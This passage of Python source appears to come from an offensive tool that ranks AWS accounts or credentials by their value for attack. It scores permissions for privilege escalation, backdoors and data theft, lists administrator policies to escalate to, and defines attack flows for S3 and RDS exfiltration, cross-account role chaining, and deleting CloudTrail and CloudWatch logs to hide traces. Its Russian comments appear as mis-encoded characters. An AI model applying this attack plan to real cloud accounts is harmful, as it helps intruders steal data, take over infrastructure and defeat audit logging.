            'iam_create_user': 60,  # –°–æ–∑–¥–∞–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏
            'iam_create_role': 60,  # –°–æ–∑–¥–∞–Ω–∏–µ —Ä–æ–ª–µ–π –¥–ª—è –ø—Ä–∏–Ω—è—Ç–∏—è —Å –ø–æ–ª–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏
            'iam_attach_user_policy': 55,  # –ü—Ä–∏–∫—Ä–µ–ø–ª–µ–Ω–∏–µ –ø–æ–ª–∏—Ç–∏–∫ —Å –ø–æ–ª–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏ –∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º
            'iam_attach_role_policy': 55,  # –ü—Ä–∏–∫—Ä–µ–ø–ª–µ–Ω–∏–µ –ø–æ–ª–∏—Ç–∏–∫ —Å –ø–æ–ª–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏ –∫ —Ä–æ–ª—è–º
            'iam_create_access_key': 50,  # –°–æ–∑–¥–∞–Ω–∏–µ –∫–ª—é—á–µ–π –¥–æ—Å—Ç—É–ø–∞ –¥–ª—è –Ω–æ–≤—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
            'iam_put_user_policy': 55,  # –°–æ–∑–¥–∞–Ω–∏–µ inline –ø–æ–ª–∏—Ç–∏–∫ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –ø–æ–ª–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏
            'iam_create_login_profile': 50,  # –°–æ–∑–¥–∞–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π –¥–ª—è –∫–æ–Ω—Å–æ–ª—å–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –∫ AWS
            'iam_update_login_profile': 45,  # –ò–∑–º–µ–Ω–µ–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π –∫–æ–Ω—Å–æ–ª—å–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –∫ AWS
            'iam_put_role_policy': 55,  # –°–æ–∑–¥–∞–Ω–∏–µ inline –ø–æ–ª–∏—Ç–∏–∫ –¥–ª—è —Ä–æ–ª–µ–π —Å –ø–æ–ª–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏
            'iam_update_assume_role_policy': 50,  # –ò–∑–º–µ–Ω–µ–Ω–∏–µ trust policy —Ä–æ–ª–µ–π –¥–ª—è —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞
            'iam_tag_role': 40,  # –î–æ–±–∞–≤–ª–µ–Ω–∏–µ —Ç–µ–≥–æ–≤ –∫ —Ä–æ–ª—è–º
            'iam_untag_role': 40,  # –£–¥–∞–ª–µ–Ω–∏–µ —Ç–µ–≥–æ–≤ —Å —Ä–æ–ª–µ–π
            'iam_pass_role': 45,  # –ü–µ—Ä–µ–¥–∞—á–∞ —Ä–æ–ª–µ–π –≤ —Å–µ—Ä–≤–∏—Å—ã –¥–ª—è —ç—Å–∫–∞–ª–∞—Ü–∏–∏ —á–µ—Ä–µ–∑ Lambda/EC2
            'sts_assume_role': 50,  # –ü—Ä–∏–Ω—è—Ç–∏–µ —Ä–æ–ª–µ–π —Å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω—ã–º –¥–æ—Å—Ç—É–ø–æ–º
            'secrets_manager_create_secret': 50,  # –°–æ–∑–¥–∞–Ω–∏–µ —Å–µ–∫—Ä–µ—Ç–æ–≤ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä—É—é—â–∏—Ö –¥–∞–Ω–Ω—ã—Ö
            'secrets_manager_update_secret': 45,  # –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö —Å–µ–∫—Ä–µ—Ç–æ–≤ —Å –Ω–æ–≤—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏
            'secrets_manager_delete_secret': 40,  # –£–¥–∞–ª–µ–Ω–∏–µ —Å–µ–∫—Ä–µ—Ç–æ–≤ –¥–ª—è —Å–æ–∫—Ä—ã—Ç–∏—è —Å–ª–µ–¥–æ–≤ –∞—Ç–∞–∫–∏
            'secrets_manager_restore_secret': 35,  # –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ —É–¥–∞–ª–µ–Ω–Ω—ã—Ö —Å–µ–∫—Ä–µ—Ç–æ–≤
            'secrets_manager_rotate_secret': 40,  # –†–æ—Ç–∞—Ü–∏—è —Å–µ–∫—Ä–µ—Ç–æ–≤
            's3_put_object': 45,  # –ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–æ–≤ –≤ S3 –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è backdoor
            's3_create_bucket': 40,  # –°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö S3 –±–∞–∫–µ—Ç–æ–≤ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö
            's3_delete_bucket': 35,  # –£–¥–∞–ª–µ–Ω–∏–µ S3 –±–∞–∫–µ—Ç–æ–≤ –¥–ª—è —Å–æ–∫—Ä—ã—Ç–∏—è —Å–ª–µ–¥–æ–≤ –∞—Ç–∞–∫–∏
            's3_get_object': 35,  # –°–∫–∞—á–∏–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ (READ –æ–ø–µ—Ä–∞—Ü–∏—è)
            's3_get_object_acl': 30,  # –ü–æ–ª—É—á–µ–Ω–∏–µ ACL –æ–±—ä–µ–∫—Ç–æ–≤
            's3_put_object_acl': 35,  # –ò–∑–º–µ–Ω–µ–Ω–∏–µ ACL –æ–±—ä–µ–∫—Ç–æ–≤
            's3_put_bucket_policy': 40,  # –ò–∑–º–µ–Ω–µ–Ω–∏–µ –ø–æ–ª–∏—Ç–∏–∫ –±–∞–∫–µ—Ç–æ–≤
            's3_put_bucket_acl': 35,  # –ò–∑–º–µ–Ω–µ–Ω–∏–µ ACL –±–∞–∫–µ—Ç–æ–≤
            'ec2_run_instances': 45,  # –°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö EC2 –∏–Ω—Å—Ç–∞–Ω—Å–æ–≤ –¥–ª—è –∫–æ–Ω—Ç—Ä–æ–ª—è –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—ã
            'ec2_create_key_pair': 40,  # –°–æ–∑–¥–∞–Ω–∏–µ SSH –∫–ª—é—á–µ–π –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –∏–Ω—Å—Ç–∞–Ω—Å–∞–º
            'ec2_start_instances': 45,  # –ó–∞–ø—É—Å–∫ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã—Ö –∏–Ω—Å—Ç–∞–Ω—Å–æ–≤ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞
            'ec2_authorize_security_group_ingress': 40,  # –û—Ç–∫—Ä—ã—Ç–∏–µ –ø–æ—Ä—Ç–æ–≤ –≤ security groups –¥–ª—è –¥–æ—Å—Ç—É–ø–∞
            'ec2_create_security_group': 40,  # –°–æ–∑–¥–∞–Ω–∏–µ –≥—Ä—É–ø–ø –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏
            'ec2_create_image': 45,  # –°–æ–∑–¥–∞–Ω–∏–µ –æ–±—Ä–∞–∑–æ–≤ AMI
            'ec2_modify_instance_attribute': 40,  # –ò–∑–º–µ–Ω–µ–Ω–∏–µ –∞—Ç—Ä–∏–±—É—Ç–æ–≤ –∏–Ω—Å—Ç–∞–Ω—Å–æ–≤
            'ec2_modify_volume': 35,  # –ò–∑–º–µ–Ω–µ–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ –¥–∏—Å–∫–æ–≤
            'ec2_create_tags': 30,  # –î–æ–±–∞–≤–ª–µ–Ω–∏–µ —Ç–µ–≥–æ–≤ –∫ —Ä–µ—Å—É—Ä—Å–∞–º
            'ec2_snapshots': 20,  # –ü—Ä–æ—Å–º–æ—Ç—Ä —Å–Ω–∏–º–∫–æ–≤ –¥–∏—Å–∫–æ–≤ –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ –¥–∞–Ω–Ω—ã—Ö
            'lambda_update_function_code': 45,  # –ò–∑–º–µ–Ω–µ–Ω–∏–µ –∫–æ–¥–∞ Lambda —Ñ—É–Ω–∫—Ü–∏–π –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ–≥–æ –∫–æ–¥–∞
            'lambda_delete_function': 35,  # –£–¥–∞–ª–µ–Ω–∏–µ Lambda —Ñ—É–Ω–∫—Ü–∏–π –¥–ª—è —Å–æ–∫—Ä—ã—Ç–∏—è —Å–ª–µ–¥–æ–≤ –∞—Ç–∞–∫–∏ –∏ –æ—á–∏—Å—Ç–∫–∏
            'lambda_get_function': 25,  # –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–µ—Ç–∞–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Ñ—É–Ω–∫—Ü–∏—è—Ö –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ –∏ –ø–ª–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –∞—Ç–∞–∫
            'lambda_update_function_configuration': 40,  # –ò–∑–º–µ–Ω–µ–Ω–∏–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ —Ñ—É–Ω–∫—Ü–∏–π –¥–ª—è –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –∏ –¥–æ—Å—Ç—É–ø–∞
            'lambda_add_permission': 45,  # –î–æ–±–∞–≤–ª–µ–Ω–∏–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π –∫ —Ñ—É–Ω–∫—Ü–∏—è–º –¥–ª—è –≤–Ω–µ—à–Ω–µ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –∏ —ç—Å–∫–∞–ª–∞—Ü–∏–∏
            'lambda_publish_version': 40,  # –ü—É–±–ª–∏–∫–∞—Ü–∏—è –≤–µ—Ä—Å–∏–π —Ñ—É–Ω–∫—Ü–∏–π –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è backdoor –∏ –ø–æ—Å—Ç–æ—è–Ω–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞
            'lambda_create_layer_version': 50,  # –°–æ–∑–¥–∞–Ω–∏–µ —Å–ª–æ–µ–≤ Lambda –¥–ª—è –≤–Ω–µ–¥—Ä–µ–Ω–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –∫–æ–¥–∞ –≤ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏
            'lambda_create_alias': 35,  # –°–æ–∑–¥–∞–Ω–∏–µ –∞–ª–∏–∞—Å–æ–≤ Lambda
            'lambda_update_alias': 30,  # –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∞–ª–∏–∞—Å–æ–≤ Lambda
            'lambda_delete_alias': 25,  # –£–¥–∞–ª–µ–Ω–∏–µ –∞–ª–∏–∞—Å–æ–≤ Lambda
            'lambda_get_layer_version': 20,  # –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–ª–æ—è—Ö
            'lambda_delete_layer_version': 30,  # –£–¥–∞–ª–µ–Ω–∏–µ –≤–µ—Ä—Å–∏–π —Å–ª–æ–µ–≤
            
            # üî¥ –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ï READ –û–ü–ï–†–ê–¶–ò–ò - –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è —É–≥—Ä–æ–∑–∞
            'secrets_manager_secrets': 45,  # –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π, API –∫–ª—é—á–µ–π, —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–æ–≤
            's3_objects': 35,  # –ü—Ä—è–º–æ–π –¥–æ—Å—Ç—É–ø –∫ –¥–∞–Ω–Ω—ã–º –±–µ–∑ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
            'systems_manager_commands': 35,  # –£–¥–∞–ª–µ–Ω–Ω–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–º–∞–Ω–¥ –Ω–∞ –≤—Å–µ—Ö —Å–µ—Ä–≤–µ—Ä–∞—Ö
            'rds_snapshots': 15,  # –ü—Ä–æ—Å–º–æ—Ç—Ä —Å–ø–∏—Å–∫–∞ —Å–Ω–∏–º–∫–æ–≤ –±–∞–∑ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
            'rds_create_db_snapshot': 40,  # –°–æ–∑–¥–∞–Ω–∏–µ —Å–Ω–∏–º–∫–æ–≤ –±–∞–∑ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è —ç–∫—Å—Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–∏ –¥–∞–Ω–Ω—ã—Ö
            'rds_start_export_task': 45,  # –≠–∫—Å–ø–æ—Ä—Ç —Å–Ω–∏–º–∫–æ–≤ RDS –≤ S3 –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö
            'rds_copy_db_snapshot': 35,  # –ö–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–Ω–∏–º–∫–æ–≤ RDS –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Ä–µ–∑–µ—Ä–≤–Ω—ã—Ö –∫–æ–ø–∏–π
            'rds_modify_db_instance': 40,  # –ò–∑–º–µ–Ω–µ–Ω–∏–µ –Ω–∞—Å—Ç—Ä–æ–µ–∫ –ë–î
            'rds_modify_db_cluster': 40,  # –ò–∑–º–µ–Ω–µ–Ω–∏–µ –Ω–∞—Å—Ç—Ä–æ–µ–∫ –∫–ª–∞—Å—Ç–µ—Ä–∞ –ë–î
            'rds_create_db_instance': 45,  # –°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö –ë–î
            'rds_create_db_cluster': 45,  # –°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤—ã—Ö –∫–ª–∞—Å—Ç–µ—Ä–æ–≤ –ë–î
            'systems_manager_parameters': 30,  # –ü–æ–ª—É—á–µ–Ω–∏–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–æ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ —Å–µ—Ä–≤–µ—Ä–æ–≤
            'systems_manager_send_command': 40,  # –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–º–∞–Ω–¥ –Ω–∞ EC2 –∏–Ω—Å—Ç–∞–Ω—Å—ã –¥–ª—è —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è
            'systems_manager_start_session': 45,  # –ò–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ã–µ —Å–µ—Å—Å–∏–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–∞—Ö —á–µ—Ä–µ–∑ SSM
            'systems_manager_terminate_session': 25,  # –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–µ—Å—Å–∏–π –Ω–∞ —Å–µ—Ä–≤–µ—Ä–∞—Ö
            'systems_manager_create_document': 45,  # –°–æ–∑–¥–∞–Ω–∏–µ SSM –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤
            'systems_manager_update_document': 40,  # –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ SSM –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤
            'systems_manager_delete_document': 35,  # –£–¥–∞–ª–µ–Ω–∏–µ SSM –¥–æ–∫—É–º–µ–Ω—Ç–æ–≤
            
            # üü° –í–´–°–û–ö–ò–ô –ü–†–ò–û–†–ò–¢–ï–¢ - –í—ã—Å–æ–∫–∞—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–æ–Ω–Ω–∞—è —Ü–µ–Ω–Ω–æ—Å—Ç—å
            'ec2_instances': 30,  # –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ —Å–µ—Ä–≤–µ—Ä–æ–≤ –∏ –∏—Ö IP –∞–¥—Ä–µ—Å–æ–≤
            's3_buckets': 30,  # –ê–Ω–∞–ª–∏–∑ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –¥–∞–Ω–Ω—ã—Ö –æ—Ä–≥–∞–Ω–∏–∑–∞—Ü–∏–∏
            'ec2_volumes': 25,  # –°–æ–∑–¥–∞–Ω–∏–µ —Å–Ω–∏–º–∫–æ–≤ –¥–∏—Å–∫–æ–≤ –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ –¥–∞–Ω–Ω—ã—Ö
            'lambda_create_function': 25,  # –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω–æ–≥–æ –∫–æ–¥–∞ –≤ –æ–±–ª–∞–∫–µ
            'kms_keys': 25,  # –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
            'rds_instances': 25,  # –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –±–∞–∑–∞—Ö –¥–∞–Ω–Ω—ã—Ö
            'rds_clusters': 25,  # –ê–Ω–∞–ª–∏–∑ –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—ã –¥–∞–Ω–Ω—ã—Ö
            
            # üü¢ –°–†–ï–î–ù–ò–ô –ü–†–ò–û–†–ò–¢–ï–¢ - –°—Ä–µ–¥–Ω—è—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–æ–Ω–Ω–∞—è —Ü–µ–Ω–Ω–æ—Å—Ç—å
            'iam_attach_group_policy': 20,  # –ü—Ä–∏–∫—Ä–µ–ø–ª–µ–Ω–∏–µ –ø–æ–ª–∏—Ç–∏–∫ —Å –ø–æ–ª–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏
            'iam_add_user_to_group': 20,  # –î–æ–±–∞–≤–ª–µ–Ω–∏–µ –≤ –≥—Ä—É–ø–ø—É —Å –≤—ã—Å–æ–∫–∏–º–∏ –ø—Ä–∞–≤–∞–º–∏
            'lambda_invoke_function': 20,  # –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ Lambda —Ñ—É–Ω–∫—Ü–∏–π
            'iam_create_group': 20,  # –°–æ–∑–¥–∞–Ω–∏–µ –≥—Ä—É–ø–ø—ã —Å –ø–æ–≤—ã—à–µ–Ω–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏
            
            # ‚ö™ –ù–ò–ó–ö–ò–ô –ü–†–ò–û–†–ò–¢–ï–¢ - –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏–æ–Ω–Ω–∞—è —Ä–∞–∑–≤–µ–¥–∫–∞
            'iam_users': 15,  # –ê–Ω–∞–ª–∏–∑ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
            'lambda_functions': 15,  # –ê–Ω–∞–ª–∏–∑ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö —Ñ—É–Ω–∫—Ü–∏–π
            
            # –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏–æ–Ω–Ω—ã–µ —Å–µ—Ä–≤–∏—Å—ã (5-10 –±–∞–ª–ª–æ–≤)
            'iam_groups': 10,
            'ec2_key_pairs': 10, 'ec2_images': 10, 'ec2_security_groups': 10,
            'kms_aliases': 10, 'systems_manager_parameters': 10,
            'kms_create_key': 40, 'kms_put_key_policy': 50,
            
            # üî¥ –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ï –¢–ï–•–ù–ò–ö–ò –£–î–ê–õ–ï–ù–ò–Ø –õ–û–ì–û–í - –°–æ–∫—Ä—ã—Ç–∏–µ —Å–ª–µ–¥–æ–≤ –∞—Ç–∞–∫
            'cloudtrail_delete_trail': 60,  # –£–¥–∞–ª–µ–Ω–∏–µ CloudTrail —Ç—Ä–µ–π–ª–æ–≤ - –º–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è —É–≥—Ä–æ–∑–∞ –¥–ª—è —Å–æ–∫—Ä—ã—Ç–∏—è –∞—É–¥–∏—Ç–∞
            'cloudtrail_stop_logging': 55,  # –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è CloudTrail
            'cloudtrail_put_event_selectors': 50,  # –ò–∑–º–µ–Ω–µ–Ω–∏–µ —Å–µ–ª–µ–∫—Ç–æ—Ä–æ–≤ —Å–æ–±—ã—Ç–∏–π –¥–ª—è —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–∏ –ª–æ–≥–æ–≤
            'cloudwatch_logs_delete_log_group': 50,  # –£–¥–∞–ª–µ–Ω–∏–µ –≥—Ä—É–ø–ø –ª–æ–≥–æ–≤ CloudWatch
            'cloudwatch_logs_stop_logging': 45,  # –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è CloudWatch Logs
            'cloudwatch_logs_put_retention_policy': 40,  # –ò–∑–º–µ–Ω–µ–Ω–∏–µ –ø–æ–ª–∏—Ç–∏–∫–∏ —Ö—Ä–∞–Ω–µ–Ω–∏—è –ª–æ–≥–æ–≤
            'cloudwatch_logs_delete_log_stream': 35,  # –£–¥–∞–ª–µ–Ω–∏–µ –ø–æ—Ç–æ–∫–æ–≤ –ª–æ–≥–æ–≤
            'cloudwatch_delete_logs': 30,  # –£–¥–∞–ª–µ–Ω–∏–µ –ª–æ–≥–æ–≤ CloudWatch
        }
        
        # –ü–æ–ª–∏—Ç–∏–∫–∏ –¥–ª—è —ç—Å–∫–∞–ª–∞—Ü–∏–∏
        self.escalation_policies = {
            "high_priority": [
                "arn:aws:iam::aws:policy/IAMFullAccess",
                "arn:aws:iam::aws:policy/AdministratorAccess"
            ],
            "service_specific": [
                "arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole",
                "arn:aws:iam::aws:policy/service-role/AWSLambdaRole",
                "arn:aws:iam::aws:policy/AmazonEKSClusterPolicy",
                "arn:aws:iam::aws:policy/AmazonEKSWorkerNodePolicy",
                "arn:aws:iam::aws:policy/SecretsManagerReadWrite"
            ]
        }
        
        # –§–ª–æ—É –∞—Ç–∞–∫ –∏ –∏—Ö —Ç—Ä–µ–±–æ–≤–∞–Ω–∏—è
        self.attack_flows = {
            "ec2_management": {
                "name": "EC2 Management Attack",
                "required_services": ["ec2_instances", "ec2_volumes", "ec2_snapshots"],
                "escalation_roles": ["AWSLambdaBasicExecutionRole", "IAMFullAccess"],
                "description": "–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ EC2 –∏–Ω—Å—Ç–∞–Ω—Å–∞–º–∏, —Å–æ–∑–¥–∞–Ω–∏–µ —Å–Ω–∞–ø—à–æ—Ç–æ–≤, –¥–æ—Å—Ç—É–ø –∫ –¥–∞–Ω–Ω—ã–º (AmazonEC2FullAccess, AWSLambdaBasicExecutionRole)"
            },
            "s3_exfiltration": {
                "name": "S3 Bucket Exfiltration",
                "required_services": ["s3_buckets", "s3_objects"],
                "escalation_roles": ["AWSLambdaBasicExecutionRole", "IAMFullAccess"],
                "description": "–ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –∏–∑ S3 –±–∞–∫–µ—Ç–æ–≤, —Å–∫–∞—á–∏–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤ (AmazonS3FullAccess, AWSLambdaBasicExecutionRole)"
            },
            "rds_data_extraction": {
                "name": "RDS Data Extraction",
                "required_services": ["rds_instances", "rds_snapshots", "rds_clusters", "rds_create_db_snapshot", "rds_start_export_task"],
                "escalation_roles": ["AWSLambdaBasicExecutionRole", "IAMFullAccess"],
                "description": "–ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –∏–∑ RDS, —Å–æ–∑–¥–∞–Ω–∏–µ —Å–Ω–∞–ø—à–æ—Ç–æ–≤ –ë–î –∏ —ç–∫—Å–ø–æ—Ä—Ç –≤ S3 (AmazonRDSFullAccess, AWSLambdaBasicExecutionRole)"
            },
            "lambda_escalation": {
                "name": "Lambda Privilege Escalation",
                "required_services": ["lambda_functions"],
                "escalation_roles": ["AWSLambdaBasicExecutionRole", "IAMFullAccess"],
                "description": "–°–æ–∑–¥–∞–Ω–∏–µ Lambda —Ñ—É–Ω–∫—Ü–∏–π —Å –ø–æ–≤—ã—à–µ–Ω–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏ (AWSLambdaBasicExecutionRole, AWSLambdaRole)"
            },
            "cross_service_attack": {
                "name": "Cross-Account Attack Chain",
                "required_services": ["sts_assume_role", "iam_create_role", "iam_pass_role"],
                "escalation_roles": ["IAMFullAccess", "AdministratorAccess"],
                "description": "–ú–µ–∂–∞–∫–∫–∞—É–Ω—Ç–Ω—ã–π –ø–µ—Ä–µ—Ö–æ–¥ —á–µ—Ä–µ–∑ —Ä–æ–ª–∏ (Cross-Account Role Assumption)"
            },
            "log_deletion": {
                "name": "Log Deletion Attack",
                "required_services": ["cloudtrail_delete_trail", "cloudtrail_stop_logging", "cloudwatch_logs_delete_log_group"],
                "escalation_roles": ["CloudTrailFullAccess", "CloudWatchLogsFullAccess"],
                "description": "–£–¥–∞–ª–µ–Ω–∏–µ –ª–æ–≥–æ–≤ –∏ —Å–æ–∫—Ä—ã—Ç–∏–µ —Å–ª–µ–¥–æ–≤ –∞—Ç–∞–∫ (CloudTrailFullAccess, CloudWatchLogsFullAccess)"
            },
            "forensic_cleanup": {
                "name": "Forensic Cleanup Attack",
                "required_services": ["secrets_manager_delete_secret", "s3_delete_bucket", "lambda_delete_function"],
                "escalation_roles": ["SecretsManagerFullAccess", "S3FullAccess", "AWSLambdaFullAccess"],
                "description": "–£–¥–∞–ª–µ–Ω–∏–µ —Å–ª–µ–¥–æ–≤ –∞—Ç–∞–∫–∏ –∏ –æ—á–∏—Å—Ç–∫–∞ –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—ã"
            }
        }
        
        # –ö–∞—Ç–µ–≥–æ—Ä–∏–∏ –∞–∫–∫–∞—É–Ω—Ç–æ–≤ (–æ–±–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –¥–ª—è –ø–æ–ª–Ω–æ–≥–æ —Å–ø–∏—Å–∫–∞ —Å–µ—Ä–≤–∏—Å–æ–≤)
        # –û–±–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏ –∞–∫–∫–∞—É–Ω—Ç–æ–≤ —Å —É—á–µ—Ç–æ–º –Ω–æ–≤—ã—Ö –±–∞–ª–ª–æ–≤ (2025)
        self.account_categories = {
            'critical': {'min_score': 50, 'emoji': 'üî•', 'name': 'CRITICAL - –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è —É–≥—Ä–æ–∑–∞'},
            'high': {'min_score': 30, 'emoji': 'üö®', 'name': 'HIGH - –í—ã—Å–æ–∫–∞—è —É–≥—Ä–æ–∑–∞'},
            'medium': {'min_score': 15, 'emoji': '‚ö†Ô∏è', 'name': 'MEDIUM - –°—Ä–µ–¥–Ω—è—è —É–≥—Ä–æ–∑–∞'},
            'low': {'min_score': 5, 'emoji': 'üìä', 'name': 'LOW - –ù–∏–∑–∫–∞—è —É–≥—Ä–æ–∑–∞'},
            'minimal': {'min_score': 0, 'emoji': 'üîç', 'name': 'MINIMAL - –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —É–≥—Ä–æ–∑–∞'}
        }
    
    def _get_adaptive_timeout(self, service_name: str, operation_type: str = "read") -> int:
        """–í–æ–∑–≤—Ä–∞—â–∞–µ—Ç –∞–¥–∞–ø—Ç–∏–≤–Ω—ã–π —Ç–∞–π–º–∞—É—Ç –¥–ª—è —Å–µ—Ä–≤–∏—Å–∞"""
        # –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–∏ —Ç—Ä–µ–±—É—é—Ç –±–æ–ª—å—à–µ –≤—Ä–µ–º–µ–Ω–∏
